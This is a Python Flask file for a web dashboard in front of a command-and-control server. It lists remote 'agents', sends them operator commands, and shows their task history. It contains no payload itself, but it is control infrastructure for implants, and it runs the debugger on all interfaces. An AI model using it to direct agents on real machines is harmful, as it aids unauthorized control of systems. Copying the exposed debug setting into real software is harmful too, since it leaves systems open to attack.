# web/app.py - Dashboard Web para C2
from flask import Flask, render_template, request, jsonify
import requests
import json

app = Flask(__name__)

# ============================================
# CONFIGURAÇÕES DIRETAS (MUDE SE NECESSÁRIO)
# ============================================
WEB_HOST = "0.0.0.0"
WEB_PORT = 5001
WEB_DEBUG = True

# URL do servidor C2 (API)
C2_API_URL = "http://localhost:5000"  # Mude para o IP do Kali se necessário

# ============================================
# ROTAS DO DASHBOARD
# ============================================

@app.route('/')
def dashboard():
    """Dashboard principal"""
    return render_template('dashboard.html')

@app.route('/api/agents')
def api_agents():
    """Retorna lista de agentes"""
    try:
        response = requests.get(f"{C2_API_URL}/agents", timeout=5)
        return jsonify(response.json())
    except Exception as e:
        print(f"Erro ao buscar agentes: {e}")
        return jsonify([])

@app.route('/api/send_command', methods=['POST'])
def api_send_command():
    """Envia comando para um agente"""
    try:
        data = request.json
        response = requests.post(f"{C2_API_URL}/send_command", json=data, timeout=5)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/agent_tasks/<agent_id>')
def api_agent_tasks(agent_id):
    """Busca histórico de tarefas de um agente"""
    try:
        response = requests.get(f"{C2_API_URL}/agents/{agent_id}/tasks", timeout=5)
        return jsonify(response.json())
    except Exception as e:
        print(f"Erro ao buscar tasks: {e}")
        return jsonify([])

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║   🌐 WEB DASHBOARD INITIALIZED 🌐     ║
    ╠═══════════════════════════════════════╣
    ║  URL: http://{}:{}                   ║
    ║  C2 API: {}                          ║
    ╚═══════════════════════════════════════╝
    """.format(WEB_HOST, WEB_PORT, C2_API_URL))
    app.run(host=WEB_HOST, port=WEB_PORT, debug=WEB_DEBUG)